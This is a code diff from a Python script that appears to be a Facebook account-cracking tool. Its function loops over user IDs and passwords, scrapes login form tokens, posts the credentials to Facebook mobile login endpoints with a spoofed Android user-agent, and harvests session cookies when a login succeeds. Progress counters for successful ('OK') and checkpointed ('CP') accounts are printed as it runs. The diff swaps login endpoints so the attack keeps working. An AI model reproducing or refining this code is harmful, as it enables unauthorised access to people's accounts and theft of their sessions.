@@ -172,7 +172,7 @@ def DEVHIS2(uid,pwx,tl):
             session = requests.Session()
             sys.stdout.write(f'\r\r\033[1;92m[FINDING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s] '%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -200,7 +200,7 @@ def DEVHIS2(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36',}
-            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
